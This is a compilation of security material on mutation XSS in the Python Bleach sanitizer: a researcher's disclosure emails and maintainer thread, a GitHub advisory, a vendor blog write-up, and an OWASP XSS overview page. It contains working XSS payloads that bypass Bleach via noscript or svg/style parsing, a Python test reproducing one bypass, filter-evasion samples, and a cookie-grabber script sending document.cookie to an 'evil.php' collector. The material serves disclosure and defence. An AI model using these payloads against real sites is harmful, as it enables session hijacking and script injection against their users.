My name is Yaniv Nizry and I’m a researcher in the CxSCA group at Checkmarx.

I discovered a security vulnerability (mXSS) in Mozilla-bleach python package.

**Details:**

noscript tag in HTML is treated differently whether JS is enable or disabled. When JS is enabled the data inside the tag is parsed as JS, but when its disabled the data is parsed as html.

Bleach relies on html5lib, a python library for parsing HTML. By looking at the implementation of html5lib in bleach’s code we can see that there is a variable named “scripting” and its default value is False

Later on in the parsing process the noscript tag will be parsed either as raw text or as html depending on the scripting value

Because JavaScript is enabled by default in the browsers but it’s disabled in the sanitizer, it causes a mutation XSS (mXSS).

**PoC:**

Firstly, I tried to give the sanitizer this input (a known mXSS string):

But for some reason the “lower than” characters inside an attribute are converted to an entity (but I saw it added the a closing tag which means the parsing inside it is HTML).

In order to get over this sanitization, we can use a tag that parses as raw text (Ex. “style” tag).

So what happened here?

The parser entered the noscript tag and started parsing as html, after that it entered the style tag and the parser changed to raw text (now nothing will get sanitize). And the parser closed the style and noscript automatically.

Now lets take a look on how the browser parses the output: The parser enters the noscript tag and starts parsing as JavaScript (no style tag is created here), and right after that exits the noscript tag.

What comes after is a normal HTML in this case an img tag with an onerror attribute.

For the PoC purposes I made a server that bleach the “payload” parameter in the url and returns it.

In order for this vulnerability to work we need the “noscript” tag to be whitelisted as well as one of the raw text parsed tags:

```
title
textarea
script
style
noembed
noframes
iframe
xmp

```

**Payload example:**

`<noscript><style></noscript><img src=x onerror=alert(1)>`

**Out in the wild example:**

Here is one of the scenarios we encountered that is exploitable.

<https://github.com/galaxyproject/galaxy>

Their sanitizer whitelists our needs to exploit the vulnerability: <https://github.com/galaxyproject/galaxy/blob/master/lib/galaxy/util/sanitize_html.py>

In the Galaxy project there is a feature to various file types, one of them is HTML that gets bleached.

Here for example the uploaded files are on the right (payload-normal.html is a simple script tag)

But when we choose to view payload.html with our exploit:

We plan on notifying the Galaxy project after you release a fix for the vulnerability.

Feel free to reply to this email for any questions.

Best regards,

Yaniv

+peterbe since MDN might be impacted. Does MDN whitelist noscript and any of the following tags

```
title
textarea
script
style
noembed
noframes
iframe
xmp

```

?

Confirmed for versions v3.1.0, v3.0.2, and v2.1.4 (getting an html5lib@1.0.1 import error on v2.1, which probably applies to other older libs). Tested with:

```
import bleach
from bleach import clean

print(bleach.__version__)

cleaned = clean(
    "<noscript><style></noscript><img src=x onerror=alert(1)>",
    tags=["noscript", "style"],
)
bad = "<img src=x onerror=alert(1)>"

assert bad not in cleaned, "got:\n{!r} did not escape:\n{!r}".format(cleaned, bad)

```

Looks like allowing `noscript` isn't required and anything up to an unclosed raw tag (anything using `parseRCDataRawtext`) gets passed through:

```

[GCC 7.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import bleach
>>> bleach.__version__

Correct but since the data inside those tags is parsed as raw-text in the browser as well, nothing will run.

The vulnerability here is that the data inside the noscript's tag is treated as html in bleach, but as raw text in the browser. This way we can trick bleach to believe something is good when in reality it’s not (I used additional raw-text tag to get over another sanitization).

Gotcha, that's clever.

So, setting `scripting=True` seems to work (bleach gives me `<noscript><style></noscript>&lt;img src=x onerror=alert(1) /&gt;` which doesn't pop an alert on Fx Nightly).

Thanks Greg,

I'm CC'ing Dan who's been looking at our `bleach` dependency most recently.

Dan, would you mind owning the Kuma angle on this? As you can see, Greg is about to submit a patch to willkg but it would be great to know how or *if* it's impacting our kuma wiki code.

Thanks Peter! Hopefully MDN doesn't need to whitelist `noscript` tags.

Created a draft advisory and PR on GH: <https://github.com/mozilla/bleach/security/advisories/GHSA-q65m-pv3f-wr5r>

Will is back on Tuesday, so assuming the patch looks good I think we can release on Tuesday or Wednesday next week. That way people aren't vulnerable and trying to patch over the weekend and we can notify people in advance.

That looks fine because `noscript` isn't whitelisted.

Yep, I added `callahad`.

# Cross Site Scripting (XSS)

**Author:** KirstenS

**Contributor(s):** Jim Manico, Jeff Williams, Dave Wichers, Adar Weidman, Roman, Alan Jex, Andrew Smith, Jeff Knutson, Imifos, Erez Yalon, kingthorin, Vikas Khanna. Grant Ongers

## Overview

Cross-Site Scripting (XSS) attacks are a type of injection, in which
malicious scripts are injected into otherwise benign and trusted
websites. XSS attacks occur when an attacker uses a web application to
send malicious code, generally in the form of a browser side script, to
a different end user. Flaws that allow these attacks to succeed are
quite widespread and occur anywhere a web application uses input from a
user within the output it generates without validating or encoding it.

An attacker can use XSS to send a malicious script to an unsuspecting
user. The end user’s browser has no way to know that the script should
not be trusted, and will execute the script. Because it thinks the
script came from a trusted source, the malicious script can access any
cookies, session tokens, or other sensitive information retained by the
browser and used with that site. These scripts can even rewrite the
content of the HTML page. For more details on the different types of XSS
flaws, see: [Types of Cross-Site Scripting](../../Types_of_Cross-Site_Scripting).

## Description

Cross-Site Scripting (XSS) attacks occur when:

1. Data enters a Web application through an untrusted source, most frequently a web request.
2. The data is included in dynamic content that is sent to a web user without being validated for malicious content.

The malicious content sent to the web browser often takes the form of a
segment of JavaScript, but may also include HTML, Flash, or any other
type of code that the browser may execute. The variety of attacks based
on XSS is almost limitless, but they commonly include transmitting
private data, like cookies or other session information, to the
attacker, redirecting the victim to web content controlled by the
attacker, or performing other malicious operations on the user’s machine
under the guise of the vulnerable site.

### Reflected and Stored XSS Attacks

XSS attacks can generally be categorized into two categories: reflected
and stored. There is a third, much less well-known type of XSS attack
called [DOM Based XSS](../DOM_Based_XSS) that is discussed
separately [here](../DOM_Based_XSS).

#### Reflected XSS Attacks

Reflected attacks are those where the injected script is reflected off
the web server, such as in an error message, search result, or any other
response that includes some or all of the input sent to the server as
part of the request. Reflected attacks are delivered to victims via
another route, such as in an e-mail message, or on some other website.
When a user is tricked into clicking on a malicious link, submitting a
specially crafted form, or even just browsing to a malicious site, the
injected code travels to the vulnerable web site, which reflects the
attack back to the user’s browser. The browser then executes the code
because it came from a “trusted” server. Reflected XSS is also sometimes
referred to as Non-Persistent or Type-I XSS (the attack is carried out
through a single request / response cycle).

#### Stored XSS Attacks

Stored attacks are those where the injected script is permanently stored
on the target servers, such as in a database, in a message forum,
visitor log, comment field, etc. The victim then retrieves the malicious
script from the server when it requests the stored information. Stored
XSS is also sometimes referred to as Persistent or Type-II XSS.

#### Blind Cross-site Scripting

Blind Cross-site Scripting is a form of persistent XSS. It generally occurs when the attacker’s payload saved on the server and reflected back to the victim from the backend application. For example in feedback forms, an attacker can submit the malicious payload using the form, and once the backend user/admin of the application will open the attacker’s submitted form via the backend application, the attacker’s payload will get executed.
Blind Cross-site Scripting is hard to confirm in the real-world scenario but one of the best tools for this is XSS Hunter.

### Other Types of XSS Vulnerabilities

In addition to Stored and Reflected XSS, another type of XSS, [DOM Based
XSS](../DOM_Based_XSS) was identified by [Amit Klein
in 2005](http://www.webappsec.org/projects/articles/071105.shtml). OWASP
recommends the XSS categorization as described in the OWASP Article:
[Types of Cross-Site Scripting](../../Types_of_Cross-Site_Scripting), which covers all
these XSS terms, organizing them into a matrix of Stored vs. Reflected
XSS and Server vs. Client XSS, where DOM Based XSS is a subset of Client
XSS.

#### XSS Attack Consequences

The consequence of an XSS attack is the same regardless of whether it is
stored or reflected ([or DOM Based](../DOM_Based_XSS)). The
difference is in how the payload arrives at the server. Do not be fooled
into thinking that a “read-only” or “brochureware” site is not
vulnerable to serious reflected XSS attacks. XSS can cause a variety of
problems for the end user that range in severity from an annoyance to
complete account compromise. The most severe XSS attacks involve
disclosure of the user’s session cookie, allowing an attacker to hijack
the user’s session and take over the account. Other damaging attacks
include the disclosure of end user files, installation of Trojan horse
programs, redirecting the user to some other page or site, or modifying
presentation of content. An XSS vulnerability allowing an attacker to
modify a press release or news item could affect a company’s stock price
or lessen consumer confidence. An XSS vulnerability on a pharmaceutical
site could allow an attacker to modify dosage information resulting in
an overdose. For more information on these types of attacks see
[Content\_Spoofing](../Content_Spoofing).

### How to Determine If You Are Vulnerable

XSS flaws can be difficult to identify and remove from a web
application. The best way to find flaws is to perform a security review
of the code and search for all places where input from an HTTP request
could possibly make its way into the HTML output. Note that a variety of
different HTML tags can be used to transmit a malicious JavaScript.
Nessus, Nikto, and some other available tools can help scan a website
for these flaws, but can only scratch the surface. If one part of a
website is vulnerable, there is a high likelihood that there are other
problems as well.

### How to Protect Yourself

The primary defenses against XSS are described in the [OWASP XSS Prevention Cheat
Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).

Also, it’s crucial that you turn off HTTP TRACE support on all web
servers. An attacker can steal cookie data via Javascript even when
document.cookie is disabled or not supported by the client. This attack
is mounted when a user posts a malicious script to a forum so when
another user clicks the link, an asynchronous HTTP Trace call is
triggered which collects the user’s cookie information from the server,
and then sends it over to another malicious server that collects the
cookie information so the attacker can mount a session hijack attack.
This is easily mitigated by removing support for HTTP TRACE on all web
servers.

The [OWASP ESAPI project](https://www.owasp.org/www-project-enterprise-security-api) has produced a set of
reusable security components in several languages, including validation
and escaping routines to prevent parameter tampering and the injection
of XSS attacks. In addition, the [OWASP WebGoat Project](https://www.owasp.org/www-project-webgoat/) training
application has lessons on Cross-Site Scripting and data encoding.

### Alternate XSS Syntax

#### XSS Using Script in Attributes

XSS attacks may be conducted without using `<script>...</script>`
tags. Other tags will do exactly the same thing, for example:
`<body onload=alert('test1')>` or other attributes like: `onmouseover`, `onerror`.

##### onmouseover

`<b onmouseover=alert('Wufff!')>click me!</b>`

##### onerror

`<img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);>`

#### XSS Using Script Via Encoded URI Schemes

If we need to hide against web application filters we may try to encode
string characters, e.g.: `a=&\#X41` (UTF-8) and use it in `IMG` tags:

`<IMG SRC=j&#X41vascript:alert('test2')>`

There are many different UTF-8 encoding notations that give us even more
possibilities.

#### XSS Using Code Encoding

We may encode our script in base64 and place it in `META` tag. This way we
get rid of `alert()` totally. More information about this method can be
found in RFC 2397

```
<META HTTP-EQUIV="refresh"
CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg">

```

These and others examples can be found at the OWASP [XSS Filter Evasion Cheat Sheet](../../xss-filter-evasion-cheatsheet) which is a true
encyclopedia of the alternate XSS syntax attack.

## Examples

Cross-site scripting attacks may occur anywhere that possibly malicious
users are allowed to post unregulated material to a trusted website for
the consumption of other valid users.

The most common example can be found in bulletin-board websites which
provide web based mailing list-style functionality.

### Example 1

The following JSP code segment reads an employee ID, eid, from an HTTP
request and displays it to the user.

```
<% String eid = request.getParameter("eid"); %>
...
Employee ID: <%= eid %>

```

The code in this example operates correctly if `eid` contains only
standard alphanumeric text. If `eid` has a value that includes
meta-characters or source code, then the code will be executed by the
web browser as it displays the HTTP response.

Initially, this might not appear to be much of a vulnerability. After
all, why would someone enter a URL that causes malicious code to run on
their own computer? The real danger is that an attacker will create the
malicious URL, then use e-mail or social engineering tricks to lure
victims into visiting a link to the URL. When victims click the link,
they unwittingly reflect the malicious content through the vulnerable
web application back to their own computers. This mechanism of
exploiting vulnerable web applications is known as Reflected XSS.

### Example 2

The following JSP code segment queries a database for an employee with a
given ID and prints the corresponding employee’s name.

```
<%...
 Statement stmt = conn.createStatement();
 ResultSet rs = stmt.executeQuery("select * from emp where id="+eid);
 if (rs != null) {
  rs.next();
  String name = rs.getString("name");
%>

Employee Name: <%= name %>

```

As in Example 1, this code functions correctly when the values of name
are well-behaved, but it does nothing to prevent exploits if they are
not. Again, this code can appear less dangerous because the value of
name is read from a database, whose contents are apparently managed by
the application. However, if the value of name originates from
user-supplied data, then the database can be a conduit for malicious
content. Without proper input validation on all data stored in the
database, an attacker can execute malicious commands in the user’s web
browser. This type of exploit, known as Stored XSS, is particularly
insidious because the indirection caused by the data store makes it more
difficult to identify the threat and increases the possibility that the
attack will affect multiple users. XSS got its start in this form with
websites that offered a “guestbook” to visitors. Attackers would include
JavaScript in their guestbook entries, and all subsequent visitors to
the guestbook page would execute the malicious code.

As the examples demonstrate, XSS vulnerabilities are caused by code that
includes unvalidated data in an HTTP response. There are three vectors
by which an XSS attack can reach a victim:

* As in Example 1, data is read directly from the HTTP request and
  reflected back in the HTTP response. Reflected XSS exploits occur
  when an attacker causes a user to supply dangerous content to a
  vulnerable web application, which is then reflected back to the user
  and executed by the web browser. The most common mechanism for
  delivering malicious content is to include it as a parameter in a
  URL that is posted publicly or e-mailed directly to victims. URLs
  constructed in this manner constitute the core of many phishing
  schemes, whereby an attacker convinces victims to visit a URL that
  refers to a vulnerable site. After the site reflects the attacker’s
  content back to the user, the content is executed and proceeds to
  transfer private information, such as cookies that may include
  session information, from the user’s machine to the attacker or
  perform other nefarious activities.
* As in Example 2, the application stores dangerous data in a database
  or other trusted data store. The dangerous data is subsequently read
  back into the application and included in dynamic content. Stored
  XSS exploits occur when an attacker injects dangerous content into a
  data store that is later read and included in dynamic content. From
  an attacker’s perspective, the optimal place to inject malicious
  content is in an area that is displayed to either many users or
  particularly interesting users. Interesting users typically have
  elevated privileges in the application or interact with sensitive
  data that is valuable to the attacker. If one of these users
  executes malicious content, the attacker may be able to perform
  privileged operations on behalf of the user or gain access to
  sensitive data belonging to the user.
* A source outside the application stores dangerous data in a database
  or other data store, and the dangerous data is subsequently read
  back into the application as trusted data and included in dynamic
  content.

### Attack Examples

**Example 1: Cookie Grabber**

If the application doesn’t validate the input data, the attacker can
easily steal a cookie from an authenticated user. All the attacker has
to do is to place the following code in any posted input(ie: message
boards, private messages, user profiles):

```
<SCRIPT type="text/javascript">
var adr = '../evil.php?cakemonster=' + escape(document.cookie);
</SCRIPT>

```

The above code will pass an escaped content of the cookie (according to
RFC content must be escaped before sending it via HTTP protocol with GET
method) to the evil.php script in “cakemonster” variable. The attacker
then checks the results of their evil.php script (a cookie grabber script
will usually write the cookie to a file) and use it.

### Error Page Example

Let’s assume that we have an error page, which is handling requests for
a non existing pages, a classic 404 error page. We may use the code
below as an example to inform user about what specific page is missing:

```
<html>
<body>
<?php
print "Not found: " . urldecode($_SERVER["REQUEST_URI"]);
?>

</body>
</html>

```

Let’s see how it works: `http://testsite.test/file_which_not_exist`
In response we get: `Not found: /file_which_not_exist`

Now we will try to force the error page to include our code: `http://testsite.test/<script>alert("TEST");</script>`
The result is: `Not found: / (but with JavaScript code <script>alert("TEST");</script>)`

We have successfully injected the code, our XSS! What does it mean? For
example, that we may use this flaw to try to steal a user’s session
cookie.

# mutation XSS in bleach.clean when noscript and raw tag whitelisted

Moderate

[g-k](/g-k)
published
GHSA-q65m-pv3f-wr5r
Feb 19, 2020

## Package

bleach
(python)

## Affected versions

<=3.1.0

## Patched versions

3.1.1

## Description

### Impact

A [mutation XSS](https://cure53.de/fp170.pdf) affects users calling `bleach.clean` with `noscript` and a raw tag (see below) in the allowed/whitelisted tags option.

### Patches

v3.1.1

### Workarounds

* modify `bleach.clean` calls to not whitelist `noscript` and one or more of the following raw tags:

```
title
textarea
script
style
noembed
noframes
iframe
xmp

```

* A strong [Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) without `unsafe-inline` and `unsafe-eval` [`script-src`s](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src)) will also help mitigate the risk.

![](https://checkmarx.com/wp-content/uploads/2020/07/Website-1024x512-1.jpg)

As part of the beta testing phase that took place earlier this year for our recently launched Software Composition Analysis solution, [CxSCA](https://checkmarx.com/cxsca-open-source-scanning/), the Checkmarx Security Research Team investigated Mozilla-Bleach, finding multiple concerning security vulnerabilities. Patches were released in mid-March 2020, with Checkmarx CxSCA customers using Bleach receiving notice of the issues in advance. Given that the patches have been in-market for some time, giving Bleach users sufficient time to update their software versions, we’re now publishing the full technical report and [proof-of-concept video](https://youtu.be/cJZg3qj7sz0) for educational purposes.

## Overview

According to documentation, “Bleach is an allowed-list-based HTML sanitizing library that escapes or strips markup and attributes and is intended for sanitizing text from untrusted sources.” In simpler terms, Bleach is a very user-friendly HTML sanitizer, and its main purpose is to disallow arbitrary tags to run (e.g., JavaScript (JS) tags and attributes to prevent cross-site scripting (XSS)).

After a bit of fuzzing and using some different approaches, Checkmarx researchers discovered the possibility that a mutation XSS (mXSS) vulnerability may exist. With further digging, these suspicions were confirmed, and several mXSS vulnerabilities were discovered in the Mozilla-Bleach python package.

An attacker abusing these vulnerabilities would have the ability to execute an arbitrary JavaScript code on the user end, via various sites or projects that use Bleach.

## Mutation XSS (mXSS)

A mXSS vulnerability occurs when there is incoherent parsing between the client and the sanitizer. To understand this better, the following example should help.

Let’s see how a standard browser interprets invalid HTML. When we enter the data below into the innerHTML of the page:[![](data:image/svg+xml...)![](https://checkmarx.com/wp-content/uploads/2020/07/Bleach-1.png)](https://checkmarx.com/wp-content/uploads/2020/07/Bleach-1.png)The browser will modify the data to make it valid html. In this case, this is what the output looks like:[![](data:image/svg+xml...)![](https://checkmarx.com/wp-content/uploads/2020/07/Bleach-2.png)](https://checkmarx.com/wp-content/uploads/2020/07/Bleach-2.png)

Now let’s try to change the ***div*** tag to a different type of tag, for example:

[![](data:image/svg+xml...)![](https://checkmarx.com/wp-content/uploads/2020/07/Bleach-3.png)](https://checkmarx.com/wp-content/uploads/2020/07/Bleach-3.png)

Doing so will generate the result below:

[![](data:image/svg+xml...)![](https://checkmarx.com/wp-content/uploads/2020/07/Bleach-4.png)](https://checkmarx.com/wp-content/uploads/2020/07/Bleach-4.png)

Both examples act differently because the data inside the tags are parsed differently according to the tag type. Now, imagine the parser goes from left to right. In the first case, after entering the ***div*** tag*,* the parser stays as html and opens an ***a*** tag with the title attribute (because the “closing” ***div*** tag is text in an attribute, it will not close the tag).

In the second case, when the parser enters the ***style*** tag, it changes to CSS parser, which means no ***a*** tag is created, and the ***style*** tag will be closed where the attribute was supposed to be.

So, how can this information help us in finding vulnerabilities? Imagine a tag that parses differently in different cases, for example, the ***noscript*** tag. The trick here is that the ***noscript*** tag in HTML is treated differently, whether JavaScript (JS) is enabled or disabled. When JS is enabled, the data inside the tag is parsed as JS. But, when it’s disabled, the data is parsed as html. In nearly all cases, JS is enabled in browsers.

Let’s take a look at how the following input is being interpreted with, and without, JS enabled:

[![](data:image/svg+xml...)![](https://checkmarx.com/wp-content/uploads/2020/07/Bleach-5.png)](https://checkmarx.com/wp-content/uploads/2020/07/Bleach-5.png)

Here, JS is disabled:

[![](data:image/svg+xml...)![](https://checkmarx.com/wp-content/uploads/2020/07/Bleach-6.png)](https://checkmarx.com/wp-content/uploads/2020/07/Bleach-6.png)

Here, JS is enabled:

[![](data:image/svg+xml...)![](https://checkmarx.com/wp-content/uploads/2020/07/Bleach-7.png)](https://checkmarx.com/wp-content/uploads/2020/07/Bleach-7.png)

## Vulnerability: CVE-2020-6802

When we tried to pass the above input to Bleach, it sanitized the ‘**<** ‘characters in the attribute, but also it closed the ***a*** tag! This means that it parsed the data in ***noscript*** as html.

[![](data:image/svg+xml...)![](https://checkmarx.com/wp-content/uploads/2020/07/Bleach-8.png)](https://checkmarx.com/wp-content/uploads/2020/07/Bleach-8.png)

In this case, the only thing left is to avoid this sanitization. If that wasn’t enough of a challenge, we attempted to enter another parsing into the equation.

[![](data:image/svg+xml...)![](https://checkmarx.com/wp-content/uploads/2020/07/Bleach-9.png)](https://checkmarx.com/wp-content/uploads/2020/07/Bleach-9.png)

This provided the outcome we were anticipating.

**Sanitizer view:**

Enters ***noscript*** and the parser is **HTML**, opens a ***style*** tag, and starts parsing as CSS (or raw text). Everything after the ***style*** tag isn’t parsed as html, so from the sanitizer’s viewpoint, there is no closing ***noscript*** tag nor ***img*** tag.

**Browser view:**

Enters ***noscript*** and the parser is changed to JavaScript. Now the ***“<style>”*** is just text, not a tag. As you can see, the closing tag, in this case, actually closes the ***noscript*** tag, and from there, everything is html.

The conditions to successful exploitation are: ***noscript*** tag allowed as well as html comments, or one of the following tags: ***title, textarea, script, style, noembed, noframes, iframe, xmp****.*

## Vulnerability: CVE-2020-6816

Shortly after, the Checkmarx Security Research Team discovered another mXSS vulnerability in Mozilla-Bleach, this time with the use of ***svg*/*math*** tags.

The caveat here is that the parsing inside those tags is like XML. So, if we enter, for example, a ***style*** tag, the data inside will act differently, whether inside or outside.

Inside an ***svg*** tag:

[![](data:image/svg+xml...)![](https://checkmarx.com/wp-content/uploads/2020/07/Bleach-10.png)](https://checkmarx.com/wp-content/uploads/2020/07/Bleach-10.png)

Without an ***svg*** tag:

[![](data:image/svg+xml...)![](https://checkmarx.com/wp-content/uploads/2020/07/Bleach-11.png)](https://checkmarx.com/wp-content/uploads/2020/07/Bleach-11.png)

This shows how differently the data inside the ***style*** tag is being parsed. In addition, some unwanted tags inside the ***svg*/*math*** will automatically pop out of the ***svg*/*math*** and will be parsed as HTML (e.g., **<*img*>**).

When the team tried to put a malicious ***img*** tag in ***svg*/*math*->*style*->*img***, Bleach acted strangely.

In case the ***img*** tag was whitelisted, it parsed it like the browser and sanitized unwanted attributes as expected. And when the **“strip”** variable was set to true (meaning it will delete unwanted data instead of sanitizing it, default is false), it got deleted. But in case **“strip”** was not changed, we could use any tag that wasn’t allowed and bypass Bleach.

[![](data:image/svg+xml...)![](https://checkmarx.com/wp-content/uploads/2020/07/Bleach-12.png)](https://checkmarx.com/wp-content/uploads/2020/07/Bleach-12.png)

After further investigation, we saw that html5lib (the parser behind Bleach) does recognize the data inside ***svg*->*style*** as tags. But for some reason, Bleach doesn’t sanitize unwanted tags.

## Impact

According to GitHub, more than 72,000 repositories are dependent on Bleach. Among them are major vendors, including multiple Fortune 500 tech companies.

## Summary of Disclosure and Events

When the first vulnerability was discovered, our research team ensured that they could reproduce the process of exploiting it. Once that was confirmed, the Checkmarx team responsibly notified Mozilla of their findings. Subsequently, they opened a Bugzilla ticket where the team helped Mozilla find a proper mitigation approach, and they fixed the issue rapidly.

Soon after that, the second vulnerability was discovered by the research team. Again, a responsible notification was sent to Mozilla, and a Bugzilla ticket was quickly opened and resolved.

Checkmarx customers using CxSCA were automatically notified to update Mozilla-Bleach.

From the reporter submitted via security@ email:

Hello,

My name is Yaniv Nizry and I’m a researcher in the CxSCA group at Checkmarx.

I reported a mXSS in bleach last month, And I encountered another way to exploit bleach again.

Details:

There are some tags that are parsed differently whether they are inside or outside a Math/Svg tags.

For example, style tag:

Inside the svg tag it parses as XML and outside it parses as raw text.

In addition, there are some tags that when applying them to the inner html of svg/math tag they pop out:

PoC:

TL;DR – Poc example <svg><style><img src=x onerror=alert(1)>

In order to exploit this we need a tag that will not sanitize our data but will be parsed as HTML/XML (in order for the tag to pop out and run).

Here is a list of those tags (our condition for exploitation is svg or math whitelisted as well as one of the following):

script

noscript

style

noframes

xmp

noembed

iframe

The data in the style tag usually doesn’t supposed to run, but since it’s in an svg, the data inside it is XML\HTML. So the img tag will pop out of the svg and run.

I started investigating where in the code the problem is. It seems that the parsing is done right (it does recognize the tags inside the svg->style not as raw text) but for some reason it doesn’t sanitize it.

this vulnerability will not work in case the strip flag in bleach.clean function is set to true (default is false), here is the place it deletes the unwanted data:

I have one speculation where the problem is:

In bleach/\_vendor/html5lib/serializer.py line 297, it ignores the namespace so if a tag is in an svg it will be treated the same, I did the patch above (not sure if it’s a good one). And also in line 302 looks like namespace check is in the TODO list.

Tests pass locally on python versions 2.7 and 3.7 (and 3.8 modulo unrelated failures for the url parsing change) and in `docs/` `make doctest` and `make linkcheck` pass.

Something interesting, when img tag is allowed it pops out like in the browser and gets sanitize but when it's not white-listed it doesn't sanitize.

(that's why the onerror attribute on the MDN test got removed, but even when i tried to use an unlisted tag Ex. <svg onload=evilJS> it got removed as well because the following line removes everything that is in an iframe tag, after the bleach clean:

parsed.filterIframeHosts(settings.ALLOWED\_IFRAME\_PATTERNS), <https://github.com/mdn/kuma/blob/b87f06ec0a1039f092b6e660ad1771839d8503c9/kuma/wiki/content.py#L195>)

Yep, I added it to <https://github.com/mozilla/bleach/security/advisories/GHSA-m6xf-fq7q-8743>

Should I file another PR like <https://github.com/mozilla/cvelist/pull/1> to get the cve details to mitre?

NM: I see the CVE details have been populated in the usual way.
